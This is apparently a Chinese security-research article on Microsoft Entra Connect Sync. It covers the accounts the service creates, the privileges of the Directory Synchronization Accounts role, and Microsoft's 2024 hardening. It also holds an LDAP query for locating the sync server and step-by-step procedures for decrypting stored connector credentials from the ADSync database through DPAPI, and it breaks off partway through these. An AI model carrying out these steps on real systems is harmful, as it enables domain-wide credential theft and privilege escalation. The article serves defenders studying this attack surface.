# Entra ID - Revisiting the Abuse History of Connect Sync-先知社区

> **来源**: https://xz.aliyun.com/news/19127  
> **文章ID**: 19127

---

# Overview

Microsoft Entra Connect（前身为 Azure AD Connect）作为微软混合身份环境的核心枢纽，已成为现代企业、组织的身份基础设施中至关重要的组件。它通过在本地 Active Directory 与 Microsoft Entra ID（前身为 Azure AD）之间建立同步桥梁，实现了身份信息的无缝流动。然而，这种强大的连接能力也使其成为攻击者极具吸引力的目标。

本文全面回溯了 Microsoft Entra Connect 同步服务（Connect Sync）的安全风险与攻击面，包括以下内容

* 攻击者如何通过获取 Connect Sync 服务器访问权限，进而提取和解密存储在本地数据库中的高权限凭据。这些凭据包括具有 DCSync 权限的本地 AD 连接器账户，以及在 Microsoft Entra ID 中拥有特权角色的云同步账户。
* 攻击者如何利用本地 AD 连接器账户执行 DCSync 攻击以转储所有本地域哈希。
* 攻击者如何利用 Microsoft Entra 连接器账户所属角色的特权访问权限在混合环境中实现权限提升和持久化。

此外，文中还提到了微软在 2024 年 8 月推出的安全加固措施已对相关攻击链产生了显著影响，其移除了若干关键权限，从而大幅降低了这些利用方式的可行性。通过对 Connect Sync 滥用历史的全面追踪，旨在为防御者提供深入的技术洞察，帮助其更好地保护这一关键的 Tier 0 资产。

# What is Connect Sync?

Microsoft Entra Connect 同步服务（Microsoft Entra Connect Sync）是 Microsoft Entra Connect 的核心组件之一。它负责处理所有与在本地环境与 Microsoft Entra ID 之间同步身份数据相关的操作。Microsoft Entra Connect Sync 是 DirSync 和 Azure AD Sync 的继任者。

> Azure AD Connect V1 在几年前发布。自那时起，其使用的多个组件已被计划淘汰，并更新为新版。若单独尝试更新每个组件，将需要大量时间和规划。
>
> 为了解决这个问题，微软将尽可能多的新版组件打包到一个新的单次发布版本中，这样用户只需进行一次更新。该版本即 Microsoft Entra Connect V2。此版本是同一软件的新版本，仍用于实现混合身份目标，但采用了最新的基础组件构建。
>
> “Azure AD Connect V1 has been retired as of August 31, 2022 and is no longer supported. Azure AD Connect V1 installations may stop working unexpectedly. If you are still using an Azure AD Connect V1 you need to upgrade to Microsoft Entra Connect V2 immediately.”

同步服务由两个部分组成：一是本地的 Microsoft Entra Connect Sync 组件，二是 Microsoft Entra ID 中的服务端组件，称为 Microsoft Entra Connect Sync service。

要使用该服务，需要在 AD 环境内的一台服务器上安装 Microsoft Entra Connect Sync agent。该代理负责从本地 AD 侧进行同步。

![arch-20250923013537087.png](images/img_19127_000.png)

从本质上讲，Connect Sync 是旧版 Azure 用于将用户从 AD 同步到 Entra ID 的方式。新的推荐方法是使用 Entra Cloud Sync。

## Microsoft Entra Connect Features

Microsoft Entra Connect 提供了一系列核心功能，实现本地 AD 与 Microsoft Entra ID 之间的无缝身份管理和混合认证：

* 密码哈希同步（Password Hash Synchronization）：一种登录方式，将本地 AD 用户密码的哈希同步到 Microsoft Entra ID。
* 直通认证（Pass-through Authentication）：一种登录方式，允许用户在本地和云端使用相同密码，无需额外的联合环境基础设施。
* 联合集成（Federation Integration）：联合功能是 Microsoft Entra Connect 的可选部分，可用于通过本地 AD FS 基础设施配置混合环境。同时提供 AD FS 管理功能，如证书续期和额外 AD FS 服务器部署。
* 同步（Synchronization）：负责创建用户、组及其他对象，并确保本地用户和组的身份信息与云端匹配。该同步还包括密码哈希。
* 健康监控（Health Monitoring）：Microsoft Entra Connect Health 提供强大的监控功能，可在 Microsoft Entra 管理中心提供集中位置查看这些活动。

## Accounts Generated and Permissions

现在让我们了解一下 Microsoft Entra Connect 使用和创建的帐户以及所需的权限。

![account5.png](images/img_19127_001.png)

Microsoft Entra Connect 使用三个账户将信息从本地 Active Directory 同步到 Microsoft Entra ID：

* AD DS Connector 账户（AD DS Connector account）：用于通过 Active Directory 域服务（AD DS）读取和写入 AD 的信息。
* ADSync 服务账户（ADSync service account）：用于运行同步服务并访问 SQL Server 数据库。
* Microsoft Entra Connector 账户（Microsoft Entra Connector account）：用于将信息写入 Microsoft Entra ID。

### AD DS Connector Account

如果在安装 Microsoft Entra Connect 时使用了快速设置（express settings），系统会默认在本地 AD 中创建一个用于同步的账户。该账户位于林根域的 Users 容器中，账户名前缀为 `MSOL_`。

该账户使用一组长且复杂的密码创建，并且密码不会过期。如果您的域中有密码策略，请确保允许该账户使用长且复杂的密码。

![image-20250923031017783.png](images/img_19127_002.png)

此外，该账户默认拥有类似以下的 Description 描述，从中可以发现 Microsoft Entra Connect 安装的计算机名：

> “Account created by Microsoft Azure Active Directory Connect with installation identifier ec762d3ba29d4df3ac56dc3032a44b1e running on computer **AZUREADC01** configured to synchronize to tenant offseclabs.tech. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.”

此外，AD DS Connector 账户会在本地 AD 中被授予以下权限：

|  |  |
| --- | --- |
| 权限 | 用途 |
| **Replicate Directory Changes** | 密码哈希同步 |
| **Replicate Directory Changes All** | 密码哈希同步 |
| Read/Write all properties User | 导入和 Exchange 混合 |
| Read/Write all properties iNetOrgPerson | 导入和 Exchange 混合 |
| Read/Write all properties Group | 导入和 Exchange 混合 |
| Read/Write all properties Contact | 导入和 Exchange 混合 |
| Reset password | 为启用密码回写做准备 |

可以看到，该账户在本地 AD 中拥有执行 DCSync 的权限，这意味着任何接管该账户的攻击者都可能危及整个本地域。

### ADSync Service Account

同步服务可以在不同类型的账户下运行，包括虚拟服务账户（VSA）、组管理服务账户（gMSA）、独立管理服务账户（sMSA）或普通用户账户。

在 2017 年 4 月发布的 Microsoft Entra Connect 中，全新安装时支持的选项已更改。如果您从早期版本的 Microsoft Entra Connect 升级，则这些其他选项不可用。

|  |  |  |
| --- | --- | --- |
| 账户类型 | 安装选项 | 描述 |
| VSA | 快速设置和自定义，2017 年 4 月及以后 | 此选项用于所有快速设置安装（域控制器上的安装除外）。对于自定义设置，它是默认选项。 |
| gMSA | 自定义，2017 年 4 月及以后 | 如果使用远程 SQL Server 实例，建议使用 gMSA。 |
| 用户账户 | 快速设置和自定义，2017 年 4 月及以后 | 仅当在 Windows Server 2008 上安装 Microsoft Entra Connect 并将其安装在域控制器上时，才会在安装过程中创建以 AAD\_ 为前缀的用户帐户。 |
| 用户账户 | 快速设置和自定义，2017 年 3 月及以前 | 安装期间会创建一个以 AAD\_ 为前缀的本地帐户。在自定义安装中，您可以指定其他帐户。 |

* **虚拟服务账户（VSA）**

虚拟服务账户（VSA）是一种特殊类型的账户，它没有密码，由 Windows 自动管理。如下图所示，同步服务利用名为 `NT SERVICE\ADSync` 的虚拟服务帐户来执行服务进程（该服务进程为 `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`）。

![image-20250923035138176.png](images/img_19127_003.png)

虚拟服务账户（VSA）适用于同步引擎与 SQL Server 位于同一台服务器的场景。如果使用远程 SQL Server，微软建议使用组管理服务账户（gMSA） 代替 VSA。

VSA 功能要求 Windows Server 2008 R2 或更高版本。如果在 Windows Server 2008 上安装 Microsoft Entra Connect，安装程序将回退为使用普通用户账户，而不是 VSA。

* **组管理服务账户（gMSA）**

如果你使用远程的 SQL Server 实例，则建议使用组管理服务账户（gMSA）。

要使用该选项，需要在“安装必需组件”页面上选择“使用现有服务账户”，然后再选择托管服务账户（Managed Service Account）：

![serviceaccount.png](images/img_19127_004.png)

在这种场景下，也可以使用 独立管理服务账户（sMSA）。不过，sMSA 只能在本地计算机上使用，相比默认的 VSA 并没有额外优势。

sMSA 功能需要 Windows Server 2012 或更高版本。如果你使用更早版本的操作系统，并且使用远程 SQL Server，那么你必须使用用户账户。

* **用户账户**

如果使用用户账户，安装向导会创建一个本地服务账户（除非你在自定义设置中指定要使用的账户）。该账户前缀为 AAD\_，用于实际运行同步服务。

如果你在域控制器上安装 Microsoft Entra Connect，该账户会在域中创建。如果你使用了远程 SQL Server 或需要身份验证的代理，则AAD\_ 服务账户必须位于域中。

![account-3.png](images/img_19127_005.png)

该 `AAD_*` 服务账户使用一个复杂且不会过期的长密码创建。

此账户用于安全存储其他账户的密码。这些密码以加密形式保存在数据库中，密钥的私钥通过 Windows 数据保护 API（DPAPI）利用加密服务的密钥加密进行保护。

如果你使用完整版本的 SQL Server，服务账户会是同步引擎所创建数据库的 DBO（数据库所有者）。若使用其他权限，服务将无法正常运行。同时，还会创建一个 SQL Server 登录。

该账户还会被授予对与同步引擎相关的文件、注册表键及其他对象的权限。

### Microsoft Entra Connector Account

在几年前，Microsoft Entra ID 会为同步服务创建一个名为 “On-Premises Directory Synchronization Service Account” 的账户，其 UPN 名称格式为：

```
SYNC_<entra connect hostname>_<random id>@tenant.example.net
```

![image-20250925075045530.png](images/img_19127_006.png)

该账户用户名的第二部分可以标识同步服务所在的服务器名称。在上图中，服务器名称为 DC1。如果你有暂存服务器（Staging Servers），则每台服务器都会拥有自己的账户。

该账户是一个本质上是一个的用户主体，密码永不过期，并存储在 Entra Connect Sync 的配置中，其身份验证方式与普通用户相同。

此外，在 Entra ID 中，该账户被授予一个特殊的“目录同步账户”（Directory Synchronization Accounts）角色。此角色被授予 Microsoft Entra Connect 执行其目录间预配职责所需的权限。

从 2025 年 5 月 28 日起，Entra ID 同步账户的身份验证方式已被更改。它不再使用一个密码永不过期、并存储在 Entra Connect Sync 服务器配置中的常规用户账户。微软发布了新版本的 Entra Connect Sync（2.5.3.0），改为使用基于应用的身份验证方式，即基于服务主体（Service Principal）和证书的身份验证，从而降低攻击面。默认情况下已不再创建 `Sync_*` 用户（已创建的 `Sync_*` 用户会在 Microsoft Entra Connect 升级时自动删除），而是改用以 `ConnectSyncProvisioning_*` 命名的应用程序/服务主体：

```
ConnectSyncProvisioning_<entra connect hostname>_<random id>
```

![image-20250924174321055.png](images/img_19127_007.png)

然而，在很多组织的环境中，由于历史遗留， `Sync_*` 用户可能依然存在。

## Directory Synchronization Accounts

“Directory Synchronization Accounts” 是默认分配给 Microsoft Entra Connector 账户的角色。其授予 Microsoft Entra Connect 执行目录间同步时所需的权限，例如根据本地 AD 用户在 Entra 中创建/更新混合 Entra 用户，在启用密码哈希同步（Password Hash Sync）时在 AD 中更改密码后更新 Entra 中的密码等。

因此，该角色非常强大，同时在 Azure Portal 和 Entra 管理中心中隐藏，且文档记录极少，这使其长期以来被视为在 Entra ID 中实现隐蔽持久化的理想后门。通过滥用该角色具有的特权，允许攻击者将 Entra 权限提升至 Global Administrator 角色。

### Before August 2024

在 2024 年 8 月之前，该角色一直拥有一些超越同步目的真正必要的敏感权限，比如该角色当时具备在租户中创建应用注册的权限。下面的表格展示了该角色截至 2024 年 8 月 8 日所有已启用的 48 个 Entra 角色权限/操作及其描述。表格中以粗体标注的在 Microsoft Entra 中被强调为特权操作。

|  |  |
| --- | --- |
| Actions | Description |
| microsoft.directory/applications/create | 创建所有类型的应用程序 |
| microsoft.directory/applications/delete | 删除所有类型的应用程序 |
| microsoft.directory/applications/appRoles/update | 更新所有应用程序的 appRoles 属性 |
| microsoft.directory/applications/audience/update | 更新应用程序的 audience 属性 |
| microsoft.directory/applications/authentication/update | 更新所有应用程序的身份验证配置 |
| microsoft.directory/applications/basic/update | 更新应用程序的基本属性 |
| **microsoft.directory/applications/credentials/update** | **更新应用程序凭据** |
| microsoft.directory/applications/notes/update | 更新应用程序的备注信息 |
| microsoft.directory/applications/owners/update | 更新应用程序的所有者 |
| microsoft.directory/applications/permissions/update | 更新应用程序的公开权限和所需权限 |
| microsoft.directory/applications/policies/update | 更新应用程序的策略 |
| microsoft.directory/applications/tag/update | 更新应用程序的标签 |
| microsoft.directory/authorizationPolicy/standard/read | 读取授权策略的标准属性 |
| **microsoft.directory/hybridAuthenticationPolicy/allProperties/allTasks** | **管理混合身份验证策略** |
| microsoft.directory/organization/dirSync/update | 更新组织的目录同步属性 |
| microsoft.directory/passwordHashSync/allProperties/allTasks | 管理 Entra ID 中密码哈希同步 (PHS) 的所有方面 |
| microsoft.directory/policies/create | 创建策略 |
| microsoft.directory/policies/delete | 删除策略 |
| microsoft.directory/policies/standard/read | 读取策略的基本属性 |
| microsoft.directory/policies/owners/read | 读取策略的所有者 |
| microsoft.directory/policies/policyAppliedTo/read | 读取策略的 policyAppliedTo 属性 |
| **microsoft.directory/policies/basic/update** | **更新策略的基本属性** |
| microsoft.directory/policies/owners/update | 更新策略的所有者 |
| microsoft.directory/policies/tenantDefault/update | 更新默认的组织策略 |
| microsoft.directory/servicePrincipals/create | 创建服务主体 |
| microsoft.directory/servicePrincipals/delete | 删除服务主体 |
| microsoft.directory/servicePrincipals/enable | 启用服务主体 |
| microsoft.directory/servicePrincipals/disable | 禁用服务主体 |
| microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials | 管理服务主体的密码单点登录凭据 |
| microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials | 读取服务主体的密码单点登录凭据 |
| microsoft.directory/servicePrincipals/appRoleAssignedTo/read | 读取服务主体的角色分配 |
| microsoft.directory/servicePrincipals/appRoleAssignments/read | 读取分配给服务主体的角色 |
| microsoft.directory/servicePrincipals/standard/read | 读取服务主体的基本属性 |
| microsoft.directory/servicePrincipals/memberOf/read | 读取服务主体所属的组 |
| microsoft.directory/servicePrincipals/oAuth2PermissionGrants/read | 读取服务主体的委派权限授予 |
| microsoft.directory/servicePrincipals/owners/read | 读取服务主体的所有者 |
| microsoft.directory/servicePrincipals/ownedObjects/read | 读取服务主体拥有的对象 |
| microsoft.directory/servicePrincipals/policies/read | 读取服务主体的策略 |
| microsoft.directory/servicePrincipals/appRoleAssignedTo/update | 更新服务主体的角色分配 |
| microsoft.directory/servicePrincipals/audience/update | 更新服务主体的 audience 属性 |
| microsoft.directory/servicePrincipals/authentication/update | 更新服务主体的身份验证属性 |
| microsoft.directory/servicePrincipals/basic/update | 更新服务主体的基本属性 |
| **microsoft.directory/servicePrincipals/credentials/update** | **更新服务主体凭据** |
| microsoft.directory/servicePrincipals/notes/update | 更新服务主体的备注 |
| microsoft.directory/servicePrincipals/owners/update | 更新服务主体的所有者 |
| microsoft.directory/servicePrincipals/permissions/update | 更新服务主体的权限 |
| microsoft.directory/servicePrincipals/policies/update | 更新服务主体的策略 |
| microsoft.directory/servicePrincipals/tag/update | 更新服务主体的标签属性 |

### After August 2024

2024 年 8 月，微软在其题为 [“General Availability - restricted permissions on Directory Synchronization Accounts (DSA) role in Microsoft Entra Connect Sync and Microsoft Entra Cloud Sync”](https://learn.microsoft.com/en-us/entra/fundamentals/whats-new-archive#general-availability---restricted-permissions-on-directory-synchronization-accounts-dsa-role-in-microsoft-entra-connect-sync-and-microsoft-entra-cloud-sync) 的公告中宣布，作为安全强化工作的一部分，已从 “Directory Synchronization Accounts” 角色中删除未使用的权限。

![image-20250924112648156.png](images/img_19127_008.png)

随着这一变更，该角色在微软官方文档中原有的 48 个 Entra 角色权限/操作均被移除，如下图所示，仅保留了一项：microsoft.directory/onPremisesSynchronization/standard/read。而在此更改之前，该权限并不存在。

> 我们可以在这里对比变更前后权限的差异：<https://github.com/MicrosoftDocs/entra-docs/commit/6cef860add24f6741d00bda9133ec7c4be91fd81>

![image-20250924120050421.png](images/img_19127_009.png)

现在该角色仅保留了这一读取权限，因此已不再属于高权限角色。单从公开权限列表看，它已不具备危险性。

然而，事实上该角色一直以来就被认为是特权角色，这并非仅因为其在 Entra 中曾被授予若干标记为“特权”的权限，更关键的在于它在私有且未记录的 “Azure AD Synchronization” API 中具有的隐式权限。

2024 年 8 月之前，攻击者可以利用 “Directory Synchronization Accounts” 角色所拥有的 Entra 权限来创建应用程序、为特权应用/服务主体添加凭据；同时还可滥用该角色在私有同步 API 中的隐式能力来创建或编辑用户、重置用户密码、修改组成员关系等，从而能进一步提升为全局管理员。2024 年 8 月以后，微软虽然删除了该角色在 Entra 中列明的所有权限，但由于对私有 “Azure AD Synchronization” API 的访问并未被角色显式列出（即存在隐式权限），这些私有 API 的能力仍可以被滥用，因而该角色仍需被视为特权角色。

# Attack of Connect Sync

随着越来越多的组织将其资源迁移到云端，传统本地环境与云之间的连接成为一个极具吸引力的攻击目标。需要安全研究员都讨论过 Microsoft Entra Connect（前称 Azure AD Connect）在本地和云环境中的权限问题。

需要注意的是，如果组织启用了密码哈希同步（Password Hash Synchronization），那么 `MSOL_*` 作为 AD DS Connector 账户自然就拥有 DCSync 权限，能够同步域控制器中的所有属性，包括密码哈希。这意味着，在本地 AD 中，Microsoft Entra Connect 使用的账户几乎等同于域管理员，这也是为什么运行 Microsoft Entra Connect 的系统/服务器应被视为 Tier 0 资产。

在 Microsoft Entra ID 中，Microsoft Entra Connect 使用的账户（例如 `Sync_*`）属于 “Directory Synchronization Accounts” 角色。该角色具有特权权限，能够管理所有服务主体、条件访问策略，甚至覆盖用户密码。这些特权使得研究攻击者在获取了安装 Microsoft Entra Connect 的主机上的管理员访问权限后，如何进一步获取和滥用这些高权限凭据，成为一个非常有趣且关键的安全课题。

## Locate the Azure ADC Server

安装 Microsoft Entra Connect（前称 Azure AD Connect）后，系统会在域内默认创建 `MSOL_*` 账户。通过这些账户在 LDAP 中的描述信息，可以方便地定位 Azure ADC 服务器：

```
Get-ADUser -LDAPFilter "(sAMAccountName=MSOL_*)" -Properties name, description | select name, description | fl
```

![image-20250925090444859.png](images/img_19127_010.png)

例如，在我的环境中，`MSOL_87c68feabd8e` 账户的描述如下所示。

```
Account created by Microsoft Azure Active Directory Connect with installation identifier 87c68feabd8e4561bab25359a8ecda7a running on computer AZUREADC02 configured to synchronize to tenant offseclabs.tech. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.
```

从中可以看出，Azure ADC 服务器的主机名为 AZUREADC02。

![image-20250925090325622.png](images/img_19127_011.png)

## Hunting for Credentials in ADSync

Microsoft Entra Connect（前称 Azure AD Connect）将其配置信息主要存储在位于以下路径的 SQL Server LocalDB 数据库中：

* C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf
* C:\Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync.mdf

其中包括在本地 Active Directory 和 Microsoft Entra ID 中使用的具有权限的账户信息。这对应于我们上文中提到的 “AD DS Connector Account” 和 “Microsoft Entra Connector Account”。并且，这些账户的敏感属性（包括密码）会以加密形式存储。

默认情况下，在部署 Microsoft Entra Connect 时，会使用 SQL Server 的 LocalDB 在主机上创建一个新数据库。我们可以使用已安装的 `C:\Program Files\Microsoft SQL Server\150\Tools\Binn\SqlLocalDb.exe` 工具查看正在运行的 SQL 实例信息，我们可以通过给出的命名管道连接到该数据库实例，如下图所示。

![image-20250925161118767.png](images/img_19127_012.png)

这里主要关注 mms\_management\_agent 和 mms\_server\_configuration 两个表：

![image-20250925154316940.png](images/img_19127_013.png)

mms\_management\_agent 表主要用于保存管理代理的私有配置信息，该表包含多个字段，其中的 “private\_configuration\_xml” 字段以 XML 格式保存了 “AD DS Connector” 和 “Microsoft Entra Connector” 账户及其相关配置信息。他们的 “ma\_type” 属性值分别为 “Extensible2” 和 “AD”，我们可以根据该字段来区分这两个账户。

![image-20250925160711966.png](images/img_19127_014.png)

上图中查询出来的两行 “private\_configuration\_xml” 字段的数据分别如下：

* Sync\_AZUREADC02\_87c68feabd8e 账户的配置信息

```
<MAConfig>
    <primary_class_mappings>
        <mapping>
            <primary_class>contact</primary_class>
            <oc-value>contact</oc-value>
        </mapping>
        <mapping>
            <primary_class>device</primary_class>
            <oc-value>device</oc-value>
        </mapping>
        <mapping>
            <primary_class>group</primary_class>
            <oc-value>group</oc-value>
        </mapping>
        <mapping>
            <primary_class>user</primary_class>
            <oc-value>user</oc-value>
        </mapping>
        <mapping>
            <primary_class>publicFolder</primary_class>
            <oc-value>publicFolder</oc-value>
        </mapping>
    </primary_class_mappings>
    <change_type_attribute />
    <add_change_type_value>Add</add_change_type_value>
    <modify_change_type_value>Modify</modify_change_type_value>
    <delete_change_type_value>Delete</delete_change_type_value>
    <ldap-dn>0</ldap-dn>
    <case_normalize_dn_for_anchor>1</case_normalize_dn_for_anchor>
    <extension-config>
        <filename>Microsoft.Azure.ActiveDirectory.Connector.dll</filename>
        <import-default-page-size>50</import-default-page-size>
        <import-max-page-size>50</import-max-page-size>
        <export-default-page-size>30</export-default-page-size>
        <export-max-page-size>30</export-max-page-size>
        <export-mode>call-based</export-mode>
        <import-mode>call-based</import-mode>
        <export-enabled>1</export-enabled>
        <import-enabled>1</import-enabled>
        <capability-bits>2147982384</capability-bits>
        <export-type>5</export-type>
        <discovery-partition />
        <discovery-schema>extensibility</discovery-schema>
        <discovery-hierarchy />
        <password-management-enabled />
        <assembly-version>2.4.27.0</assembly-version>
    </extension-config>
    <file-type>Extensible2</file-type>
    <importing>
        <dn>
            <attribute object_class="contact">cloudAnchor</attribute>
            <attribute object_class="device">cloudAnchor</attribute>
            <attribute object_class="group">cloudAnchor</attribute>
            <attribute object_class="user">cloudAnchor</attribute>
            <attribute object_class="publicFolder">cloudAnchor</attribute>
        </dn>
        <anchor>
            <attribute object_class="contact">cloudAnchor</attribute>
            <attribute object_class="device">cloudAnchor</attribute>
            <attribute object_class="group">cloudAnchor</attribute>
            <attribute object_class="user">cloudAnchor</attribute>
            <attribute object_class="publicFolder">cloudAnchor</attribute>
        </anchor>
        <per-class-settings>
            <class>
                <name>contact</name>
                <anchor>
                    <attribute>cloudAnchor</attribute>
                </anchor>
            </class>
            <class>
                <name>device</name>
                <anchor>
                    <attribute>cloudAnchor</attribute>
                </anchor>
            </class>
            <class>
                <name>group</name>
                <anchor>
                    <attribute>cloudAnchor</attribute>
                </anchor>
            </class>
            <class>
                <name>user</name>
                <anchor>
                    <attribute>cloudAnchor</attribute>
                </anchor>
            </class>
            <class>
                <name>publicFolder</name>
                <anchor>
                    <attribute>cloudAnchor</attribute>
                </anchor>
            </class>
        </per-class-settings>
    </importing>
    <parameter-definitions>
        <parameter>
            <name>UserName</name>
            <use>connectivity</use>
            <type>string</type>
            <validation />
            <text />
            <default-value />
        </parameter>
        <parameter>
            <name>Password</name>
            <use>connectivity</use>
            <type>encrypted-string</type>
            <validation />
            <text />
            <default-value />
        </parameter>
    </parameter-definitions>
    <parameter-values>
        <parameter name="UserName" type="string" use="connectivity" dataType="String">
            Sync_AZUREADC02_87c68feabd8e@offseclabsitoutlook.onmicrosoft.com</parameter>
        <parameter name="Password" type="encrypted-string" use="connectivity" dataType="String"
            encrypted="1" />
        <parameter name="PasswordResetConfiguration" type="encrypted-string" use="connectivity"
            dataType="String" encrypted="1" />
    </parameter-values>
    <possible_component_mappings />
    <aad-password-reset-config>
        <enabled>1</enabled>
        <modified-timestamp>2025-09-24 23:54:01.039</modified-timestamp>
        <adal-authority>HTTPS://LOGIN.MICROSOFTONLINE.COM/OFFSECLABS.TECH</adal-authority>
    </aad-password-reset-config>
</MAConfig>
```

* MSOL\_87c68feabd8e 账户的配置信息

```
<adma-configuration>
    <forest-name>offseclabs.tech</forest-name>
    <forest-port>0</forest-port>
    <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
    <forest-login-user>MSOL_87c68feabd8e</forest-login-user>
    <forest-login-domain>OFFSECLABS.TECH</forest-login-domain>
    <sign-and-seal>1</sign-and-seal>
    <ssl-bind crl-check="0">0</ssl-bind>
    <simple-bind>0</simple-bind>
    <default-ssl-strength>0</default-ssl-strength>
    <parameter-values>
        <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">
            OFFSECLABS.TECH</parameter>
        <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">
            MSOL_87c68feabd8e</parameter>
        <parameter name="forest-port" type="string" use="connectivity" dataType="String">0</parameter>
        <parameter name="forest-guid" type="string" use="connectivity" dataType="String">
            {00000000-0000-0000-0000-000000000000}</parameter>
        <parameter name="default-ssl-strength" type="string" use="connectivity" dataType="String">0</parameter>
        <parameter name="password" type="encrypted-string" use="connectivity" dataType="String"
            encrypted="1" />
        <parameter name="forest-name" type="string" use="connectivity" dataType="String">
            offseclabs.tech</parameter>
        <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
        <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
        <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
        <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
        <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global"
            dataType="String" />
        <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String"
            intrinsic="1">0x2</parameter>
        <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String"
            intrinsic="1">0x00000002</parameter>
        <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global"
            dataType="String" intrinsic="1">0x00000004</parameter>
        <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String"
            intrinsic="1">0x00000004</parameter>
        <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global"
            dataType="String" intrinsic="1">0x00000008</parameter>
        <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global"
            dataType="String" intrinsic="1">0x80000000</parameter>
        <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">
            offseclabs.tech</parameter>
        <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">
            DC=offseclabs,DC=tech</parameter>
        <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">
            OFFSECLABS</parameter>
    </parameter-values>
    <password-hash-sync-config>
        <enabled>1</enabled>
        <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
    </password-hash-sync-config>
</adma-configuration>
```

正如你所见，返回的 XML 中省略了相关账户的密码，而实际的密码则存储在与它们对应的另一个 “encrypted\_configuration” 字段中，该字段以加密形式保存敏感的凭据信息。

mms\_server\_configuration 表主要用于存储与服务器相关的全局配置信息，其中包括实例 ID（instance\_id）、密钥集 ID（keyset\_id）、熵值（entropy）等关键数据。这些信息可用于后续解密 mms\_management\_agent 表中 encrypted\_configuration 字段所保存的加密内容：

![image-20250925163346149.png](images/img_19127_015.png)

## Decrypting Credentials from ADSync

接下来，我们将介绍如何从 ADSync 数据库中解密凭据。首先，我们将分析不同版本的 Microsoft Entra Connect（前称 Azure AD Connect）在密钥集存储和解密流程上的差异。随后，重点介绍一种更为简化的解密方法：通过模拟 ADSync 服务进程的令牌，在 `NT SERVICE\ADSync` 账户的安全上下文中，利用其内置的程序集直接完成解密操作。

### Before Azure AD Connect 1.4.x

在 Azure AD Connect 1.4.x 之前，为了解密 “encrypted\_configuration” 字段中保存的加密凭据，微软使用了一个以加密形式存放在注册表中的密钥集（Keyset）。密钥集的 ID 则保存在 “mms\_server\_configuration” 表中，对应的密钥集实体位于注册表路径 `HKLM\Software\Microsoft\Ad Sync\Shared\[keysetid]` 中。

该密钥集受到系统的 MasterKey 保护，可以结合 “mms\_server\_configuration” 表中存储的熵值，通过 DPAPI 来解密。密钥集一旦被解密，其包含的密钥即可用于解密数据库中存储的加密属性。

![hpWsKKdEbW0RKHYUZYt5VUhlhBuBQby69LIxDNswdnQ0I6ZbPyGZG3IIaOQfoYQO.png](images/img_19127_016.png)

具体来说，我们可以通过以下流程从 ADSync 数据库中提取并解密相关加密凭据：

1. 停止 ADSync 服务以释放 ADSync.mdf 数据库文件上的锁；
2. 将 ADSync.mdf 数据库文件拷贝到本地；
3. 重启 ADSync 服务；
4. 从拷贝的 ADSync.mdf 数据库文件中读取数据，包括 “mms\_management\_agent” 表中 “encrypted\_configuration” 字段的加密凭据以及 “mms\_server\_configuration” 表中的 instance\_id、keyset\_id 和 entropy；
5. 转储 SYSTEM 和 SECURITY 注册表，并从中提取 DPAPI\_SYSTEM 机密；
6. 根据数据库中读取的 keyset\_id 值，在 `HKLM\Software\Microsoft\Ad Sync\Shared\[keysetid]` 注册表中读取读取对应的密钥集；
7. 对该密钥集的 DPAPI Data blob 进行解析，以找出保护它的系统 MasterKey；
8. 使用 DPAPI\_SYSTEM 解密与密钥集对应的系统 MasterKey；
9. 使用得到的系统 MasterKey 和数据库中读取的 entropy 值来解密密钥集；
10. 使用得到的密钥集通过 AES 算法解密 “encrypted\_configuration” 字段中存储的加密数据，得到最终的凭据。

### After Before Azure AD Connect 1.4.x

在 2019 年 Azure AD Connect 1.4.x 发布后，微软改变了密钥集的存储方式：密钥集被放入 Windows 凭据管理器（Credential Manager），并由用户级别的 MasterKey 保护。这使得只有 `NT SERVICE\ADSync` 虚拟服务账户才可以访问这些密钥并从数据库中解密凭据，因此我们必须想办法从凭据管理器中提取该密钥集。

![pNCdKVFvfNtDTErePnJuAxvf9ruu1uBW2Xh56t7vVXfbQ9iweBk1IppLTbUOEyr5.png](images/img_19127_017.png)

但这一切的前提是必须先解密 `NT SERVICE\ADSync` 账户的 MasterKey。如果该该用户有密码，则整个过程相对简单，但虚拟服务账户本身没有密码，且任何网络活动都使用计算机账户进行。因此即使从 LSASS 导出得到的是计算机账户的哈希/密码，这些也不能直接等同于虚拟服务账户的凭证/密码。

幸运的是，基于 Dirk-jan Mollema 与 Benjamin Delpy 的分析可知：虚拟服务账户的 MasterKey 实际上可用系统级 DPAPI（DPAPI\_SYSTEM）中的用户密钥（User Key）与该虚拟服务账户的 SID 的组合来解密。换言之，通过获取并使用 DPAPI\_SYSTEM 中的 User Key 与目标虚拟账户 SID（对于 `NT SERVICE\ADSync` 账户来说，它的 SID 值为 S-1-5-80），就能解密该账户的 MasterKey，从而访问 Credential Manager 中存储的密钥集。

具体来说，要从 ADSync 数据库中提取并解密相关加密凭据，我们可以在既有流程的基础上进行以下更新：

1. 停止 ADSync 服务以释放 ADSync.mdf 数据库文件上的锁；
2. 将 ADSync.mdf 数据库文件拷贝到本地；
3. 重启 ADSync 服务；
